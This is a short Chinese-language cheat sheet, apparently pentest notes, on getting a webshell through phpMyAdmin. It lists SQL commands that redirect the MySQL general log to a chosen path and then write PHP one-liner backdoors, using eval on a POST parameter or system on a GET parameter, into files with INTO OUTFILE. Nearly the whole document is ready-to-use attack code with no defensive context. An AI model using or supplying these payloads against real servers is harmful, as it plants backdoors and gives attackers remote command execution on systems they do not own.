# phpmyadmin 拿 webshell

## 写入日志文件

### 前提知识

```sql
general_log			# 指是否启动记录日志
general_log_file 	# 指日志文件的路径

# 查询
SHOW VARIABLES LIKE "%general_log%";
```

### 修改配置

```sql
set global general_log = "ON";
SET global general_log_file = "<path>";
```

### 写入shell

```sql
select "<?php eval($_POST['pass']);?>";
```

## 写入任意文件

### 前提知识

```sql
# secure-file-priv
# NULL，表示禁止
# 值，则表示只允许该目录下文件
# 空，则表示不限制目录

# 查询语句
SHOW VARIABLES LIKE "secure_file_priv";
```

### 修改配置

```sql
# 需要在配置文件中修改
```

### 第一种方法：

```sql
CREATE TABLE mysql.darkmoon (darkmoon1 TEXT NOT NULL );
INSERT INTO mysql.darkmoon (darkmoon1 ) VALUES ('<?php @eval($_POST[pass]);?>');
SELECT darkmoon1 FROM darkmoon INTO OUTFILE '<path>';
DROP TABLE IF EXISTS darkmoon;
```

### 第二种方法：

```sql
Create TABLE moon (darkmoon text NOT NULL);
Insert INTO moon (darkmoon) VALUES('<?php @eval($_POST[pass]);?>');
select darkmoon from moon into outfile '<path>';
Drop TABLE IF EXISTS moon;
```

### 第三种方法：

```sql
select '<?php @eval($_POST[pass]);?>'INTO OUTFILE '<path>';
```

### 第四种方法：

```sql
select '<?php echo \'<pre>\';system($_GET[\'cmd\']); echo \'</pre>\'; ?>' INTO OUTFILE '<path>';
```

